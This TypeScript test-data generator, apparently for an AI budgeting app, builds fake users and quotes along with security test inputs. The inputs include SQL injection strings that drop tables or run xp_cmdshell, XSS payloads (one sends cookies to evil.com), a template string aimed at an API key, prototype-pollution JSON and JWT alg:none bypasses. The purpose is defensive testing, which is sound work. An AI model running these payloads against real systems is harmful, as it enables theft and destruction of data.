// ===== SYNTHETIC DATA GENERATOR =====
// Genera datos realistas para tests de database, API, E2E, performance y security
// Simula usuarios, empresas, presupuestos, archivos, payloads maliciosos y datos extremos

import type {
  BudgetData,
  BudgetCliente,
  BudgetEmpresa,
  BudgetItem,
  BudgetTotals,
  BudgetCondiciones,
  Currency,
  TemplateId,
  RawInput,
  ImageInput,
  VisionAnalysis,
  ParsedInput,
  BudgetRow,
  BudgetStatus,
} from '@/types/budget';

// ==============================================
// 1. GENERADOR DE USUARIOS FALSOS
// ==============================================

const FIRST_NAMES = [
  'Juan', 'María', 'Carlos', 'Laura', 'Pedro', 'Ana', 'Diego', 'Sofía',
  'Martín', 'Valentina', 'Luis', 'Camila', 'Andrés', 'Florencia', 'Jorge',
  'Lucía', 'Gabriel', 'Elena', 'Ricardo', 'Paula',
];

const LAST_NAMES = [
  'González', 'Rodríguez', 'López', 'Fernández', 'Martínez', 'Pérez',
  'García', 'Sánchez', 'Romero', 'Torres', 'Díaz', 'Alvarez', 'Ruiz',
  'Castillo', 'Medina', 'Rojas', 'Moreno', 'Acosta', 'Ortiz', 'Molina',
];

const EMAIL_DOMAINS = [
  'gmail.com', 'hotmail.com', 'outlook.com', 'yahoo.com.ar',
  'empresa.com.ar', 'constructora.com', 'gmail.com',
];

const COMPANY_NAMES = [
  'Constructora del Sur', 'TechBuild AR', 'Obras y Servicios SA',
  'Construcciones Modernas', 'Ingeniería y Proyectos', 'Arquitectura Total',
  'Desarrollos Inmobiliarios', 'Remodelaciones Express', 'Obras Civiles SA',
  'Diseño y Construcción', 'Construcciones Metálicas', 'Pisos y Revoques',
];

const STREETS = [
  'Av. Corrientes', 'Av. 9 de Julio', 'Calle Florida', 'Av. Santa Fe',
  'Calle Lavalle', 'Av. Callao', 'Calle Florida', 'Av. Alem',
  'Calle San Martín', 'Av. Colón', 'Calle Mitre', 'Calle Belgrano',
];

const WORK_CATEGORIES = [
  'Construcción', 'Electricidad', 'Plomería', 'Pintura', 'Humedad',
  'Revoques', 'Instalaciones', 'Demolición', 'Techos', 'Pisos',
];

const ITEM_UNITS = ['m²', 'ml', 'unidad', 'hora', 'kg', 'm³', 'lt', 'punto'];

const ITEM_DESCRIPTIONS: Record<string, string[]> = {
  'Construcción': [
    'Reparación de revoque en pared exterior',
    'Construcción de muro de ladrillos',
    'Aplicación de membrana impermeabilizante',
    'Colocación de contrapiso',
  ],
  'Electricidad': [
    'Instalación de cableado eléctrico',
    'Colocación de tablero eléctrico',
    'Reparación de circuito existente',
    'Instalación de artefactos de iluminación',
  ],
  'Plomería': [
    'Instalación de cañerías de agua',
    'Reparación de pérdida en baño',
    'Colocación de artefactos sanitarios',
    'Desobstrucción de desagües',
  ],
  'Pintura': [
    'Pintura de paredes interiores latex',
    'Pintura de exteriores impermeable',
    'Lijado y enduido de superficies',
    'Aplicación de esmalte sintético',
  ],
};

interface FakeUser {
  nombre: string;
  apellido: string;
  email: string;
  empresa: string;
  telefono: string;
  direccion: string;
  cuit: string;
}

function randomPick<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomFloat(min: number, max: number, decimals = 2): number {
  return parseFloat((Math.random() * (max - min) + min).toFixed(decimals));
}

export function generateFakeUser(): FakeUser {
  const nombre = randomPick(FIRST_NAMES);
  const apellido = randomPick(LAST_NAMES);
  const domain = randomPick(EMAIL_DOMAINS);
  const email = `${nombre.toLowerCase()}.${apellido.toLowerCase()}@${domain}`;
  const empresa = `${apellido} ${randomPick(['Construcciones', 'Servicios', 'Obras', 'Remodelaciones'])}`;

  return {
    nombre,
    apellido,
    email: email.replace(/[^a-z0-9@._-]/g, ''),
    empresa,
    telefono: `11-${randomInt(1000, 9999)}-${randomInt(1000, 9999)}`,
    direccion: `${randomPick(STREETS)} ${randomInt(100, 5000)}, CABA`,
    cuit: `${randomInt(20, 34)}-${randomInt(10000000, 99999999)}-${randomInt(0, 9)}`,
  };
}

export function generateFakeUsers(count: number): FakeUser[] {
  return Array.from({ length: count }, () => generateFakeUser());
}

// ==============================================
// 2. GENERADOR DE PRESUPUESTOS FALSOS
// ==============================================

export function generateFakeBudgetItem(category?: string): BudgetItem {
  const cat = category || randomPick(WORK_CATEGORIES);
  const descs = ITEM_DESCRIPTIONS[cat] || ITEM_DESCRIPTIONS['Construcción'];
  const cantidad = randomInt(1, 100);
  const precioUnitario = randomFloat(500, 50000);
  const precioTotal = parseFloat((cantidad * precioUnitario).toFixed(2));

  return {
    id: crypto.randomUUID(),
    titulo: randomPick(descs).split(' - ')[0],
    descripcion: randomPick(descs),
    unidad: randomPick(ITEM_UNITS),
    cantidad,
    precioUnitario,
    precioTotal,
    categoria: cat,
    imagenes: [],
    observaciones: Math.random() > 0.7 ? 'Incluye materiales' : undefined,
  };
}

export function generateFakeBudgetItems(min = 3, max = 12): BudgetItem[] {
  const count = randomInt(min, max);
  const categories = randomPick([WORK_CATEGORIES.slice(0, 2), WORK_CATEGORIES.slice(1, 3)]);
  return Array.from({ length: count }, () => generateFakeBudgetItem(randomPick(categories)));
}

export function generateFakeBudgetData(overrides?: Partial<BudgetData>): BudgetData {
  const currency: Currency = Math.random() > 0.7 ? 'USD' : 'ARS';
  const cliente = generateFakeUser();
  const items = generateFakeBudgetItems();
  const tasaImpuesto = currency === 'USD' ? 0 : 0.21;
  const subtotal = items.reduce((acc, item) => acc + item.precioTotal, 0);
  const impuestos = subtotal * tasaImpuesto;
  const total = subtotal + impuestos;

  const budgetData: BudgetData = {
    id: crypto.randomUUID(),
    numero: `PRES-${new Date().getFullYear()}-${randomInt(1000, 9999)}`,
    titulo: `Presupuesto de ${randomPick(['Obra', 'Reparación', 'Remodelación', 'Mantenimiento'])}`,
    cliente: {
      nombre: cliente.nombre,
      empresa: cliente.empresa,
      email: cliente.email,
      telefono: cliente.telefono,
      direccion: cliente.direccion,
      cuit: cliente.cuit,
    },
    empresa: {
      nombre: 'BudgetAI Demo',
      email: 'demo@budgetai.com',
      telefono: '11-5555-1234',
      cuit: '30-12345678-9',
    },
    categoria: randomPick(WORK_CATEGORIES),
    descripcionGeneral: `Trabajos de ${randomPick(['construcción', 'reparación', 'mantenimiento', 'remodelación'])} según relevamiento técnico realizado en el lugar.`,
    items,
    totales: {
      subtotal,
      impuestos,
      tasaImpuesto,
      total,
      currency,
    },
    condiciones: {
      validezDias: 30,
      formaPago: randomPick(['Transferencia bancaria', 'Efectivo', 'Cheque', 'Mercado Pago']),
      plazoDias: randomInt(0, 60),
      garantia: '6 meses por defectos de mano de obra',
      notas: 'Precios sujetos a variación según cotización de materiales.',
    },
    createdAt: new Date(Date.now() - randomInt(0, 30) * 86400000).toISOString(),
    templateId: randomPick(['construction', 'minimal-white']) as TemplateId,
    observaciones: Math.random() > 0.5 ? 'Se requiere anticipo del 30% para inicio de obra.' : undefined,
    ...overrides,
  };

  return budgetData;
}

export function generateFakeBudgets(count: number): BudgetData[] {
  return Array.from({ length: count }, () => generateFakeBudgetData());
}

// ==============================================
// 3. GENERADOR DE DATOS EXTREMOS Y MALFORMADOS
// ==============================================

export function generateExtremeStrings(): string[] {
  return [
    // Strings enormes
    'A'.repeat(10000),
    'X'.repeat(100000),
    // Unicode attacks
    '𝓢𝓺𝓵 𝓘𝓷𝓳𝓮𝓬𝓽𝓲𝓸𝓷',  // Mathematical bold script
    '\u202E\u202E\u202E TR\u039F\u03A1\u039F\u039E\u039D\u039F',  // RTL override + Greek
    '𝕊𝕢𝕝𝕀𝕟𝕛𝕖𝕔𝕥𝕚𝕠𝕟',  // Double-struck
    // Zero-width characters
    '\u200B\u200B\u200Bhidden\u200B\u200B',
    // Control characters
    '\x00\x01\x02\x03BREAK',
    // JSON injection
    '{"__proto__": {"polluted": true}}',
    '{"constructor": {"prototype": {"admin": true}}}',
    // Null bytes
    'import\x00system',
    'SELECT * FROM \x00users',
    // Extremely long unicode
    '𝄞'.repeat(5000),
  ];
}

export function generateSQLInjectionPayloads(): string[] {
  return [
    "'; DROP TABLE budgets; --",
    "' OR '1'='1",
    "'; SELECT * FROM auth.users WHERE '1'='1",
    "'; UPDATE budgets SET status='exported' WHERE '1'='1",
    "admin'--",
    "'; EXEC xp_cmdshell('dir'); --",
    "' UNION SELECT * FROM pg_shadow --",
    "1; SELECT pg_sleep(5) --",
    "'; GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO anon; --",
    "' OR 1=1 LIMIT 1 --",
    '\' OR \'1\'=\'1\' /*',
    "'; DELETE FROM budgets; --",
    "'; COPY budgets TO '/tmp/export.csv'; --",
  ];
}

export function generateXSSPayloads(): string[] {
  return [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(document.cookie)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    "javascript:alert('XSS')",
    '<scr<script>ipt>alert("nested")</scr</script>ipt>',
    '<a href="javascript:alert(1)">click</a>',
    '<div style="background:url(javascript:alert(1))">',
    '--><script>alert(1)</script>',
    '<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>',
    '{{constructor.constructor(\'alert(1)\')()}}',
    '<%= `\${7*7}` %>',
    '${process.env.GEMINI_API_KEY}',
    '{{7*7}}',
    '<script>eval(atob("YWxlcnQoMSk"))</script>',
  ];
}

export function generateMalformedJSON(): string[] {
  return [
    '{broken json',
    '{"unclosed": "object"',
    '{"mixed": "quotes"}',
    '{null bytes: \x00\x01\x02}',
    '{"recursive": null}',
    '[1, 2,, 4]',
    '{1: "numeric_key"}',
    '{undefined: "value"}',
    "function(){return 'not json'}",
    '{<script>alert(1)</script>: "value"}',
    '{ "a": 1, "a": 2, "a": 3 }',  // Duplicate keys
    '{ "price": 1e999 }',  // Overflow
    '{ "symbol": Symbol("test") }',
    '{ "bigint": 123456789012345678901234567890n }',
  ];
}

// ==============================================
// 4. GENERADOR DE ARCHIVOS DE PRUEBA
// ==============================================

export function generateMalformedBase64(): string {
  return 'not-actually-base64!!@#$%^&*()';
}

export function generateEmptyPDF(): string {
  // Minimal valid PDF with no content
  return Buffer.from(
    '%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\nxref\n0 3\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \ntrailer<</Size 3/Root 1 0 R>>\nstartxref\n113\n%%EOF'
  ).toString('base64');
}

export function generateLargeJSON(sizeKb: number): string {
  const obj: Record<string, string> = {};
  for (let i = 0; i < sizeKb * 2; i++) {
    obj[`key_${i}_${Math.random().toString(36).substring(2, 7)}`] = 'X'.repeat(500);
  }
  return JSON.stringify(obj);
}

// ==============================================
// 5. GENERADOR DE RAW INPUTS PARA TESTS AI
// ==============================================

export function generateRawInput(overrides?: Partial<RawInput>): RawInput {
  const user = generateFakeUser();

  return {
    texto: `Necesito presupuesto para reparar la humedad en mi casa. 
Las paredes del living tienen aproximadamente 8 metros cuadrados con humedad ascendente.
También hay que reparar grietas en el cielorraso del baño y pintar dos habitaciones.
El cliente es ${user.nombre} ${user.apellido} de ${user.empresa}.`,
    templateId: 'construction',
    currency: 'ARS',
    empresa: {
      nombre: 'YPY Construcciones',
      email: 'presupuestos@ypy.com.ar',
      telefono: '11-5555-4321',
    },
    tasaImpuesto: 0.21,
    ...overrides,
  };
}

export function generateParsedInput(overrides?: Partial<ParsedInput>): ParsedInput {
  const user = generateFakeUser();

  return {
    clienteInfo: {
      nombre: `${user.nombre} ${user.apellido}`,
      empresa: user.empresa,
    },
    descripcionRaw: 'Reparación de humedad ascendente en paredes de living (8m²), reparación de grietas en cielorraso de baño, y pintura general de 2 habitaciones.',
    trabajosDetectados: [
      'Reparación de humedad en paredes',
      'Sellado de grietas en cielorraso',
      'Revoque fino',
      'Pintura general interior',
    ],
    categoriaSugerida: 'Construcción',
    ...overrides,
  };
}

// ==============================================
// 6. GENERADOR DE DATOS DE RENDIMIENTO MASIVO
// ==============================================

export function generateBulkBudgetRows(count: number): BudgetRow[] {
  return Array.from({ length: count }, (_, i) => {
    const budget = generateFakeBudgetData();
    const statuses: BudgetStatus[] = ['draft', 'generating', 'ready', 'exported'];
    return {
      id: crypto.randomUUID(),
      user_id: `user-${Math.floor(i / 10)}`,
      title: budget.titulo,
      raw_input: 'Test input for bulk operations',
      ai_output: budget,
      template_id: budget.templateId,
      status: statuses[i % statuses.length],
      created_at: new Date(Date.now() - i * 3600000).toISOString(),
      updated_at: new Date().toISOString(),
    };
  });
}

// ==============================================
// 7. GENERADOR DE DATOS DE SEGURIDAD
// ==============================================

export function generateAuthBypassPayloads() {
  return {
    jwtManipulations: [
      { alg: 'none', typ: 'JWT', payload: { sub: 'admin', role: 'admin' } },
      { alg: 'HS256', typ: 'JWT', payload: { sub: 'user', iat: 0 } },
      null,
      undefined,
      {},
      { token: 'Bearer ' },
      { token: null },
    ],
    headerInjections: [
      { 'X-Forwarded-For': '127.0.0.1' },
      { 'X-Real-IP': '0.0.0.0' },
      { 'Authorization': 'Bearer ' + 'A'.repeat(1000) },
      { 'Cookie': 'auth_token=invalid; session=expired' },
    ],
    requestForgeries: [
      { origin: 'https://evil.com' },
      { referer: 'https://malicious-site.com' },
      { 'x-csrf-token': 'invalid' },
    ],
  };
}

// ==============================================
// 8. EXPORTACIÓN COMPLETA DE DATOS SINTÉTICOS
// ==============================================

export function generateCompleteTestDataset() {
  return {
    users: generateFakeUsers(10),
    budgets: generateFakeBudgets(5),
    rawInputs: Array.from({ length: 3 }, () => generateRawInput()),
    parsedInputs: Array.from({ length: 3 }, () => generateParsedInput()),
    extremeStrings: generateExtremeStrings(),
    sqlInjections: generateSQLInjectionPayloads(),
    xssPayloads: generateXSSPayloads(),
    malformedJSON: generateMalformedJSON(),
    authBypass: generateAuthBypassPayloads(),
    largeDataset: generateBulkBudgetRows(100),
  };
}

export type TestDataset = ReturnType<typeof generateCompleteTestDataset>;

export default {
  generateFakeUser,
  generateFakeUsers,
  generateFakeBudgetData,
  generateFakeBudgets,
  generateRawInput,
  generateParsedInput,
  generateSQLInjectionPayloads,
  generateXSSPayloads,
  generateMalformedJSON,
  generateAuthBypassPayloads,
  generateCompleteTestDataset,
  generateBulkBudgetRows,
  generateExtremeStrings,
};
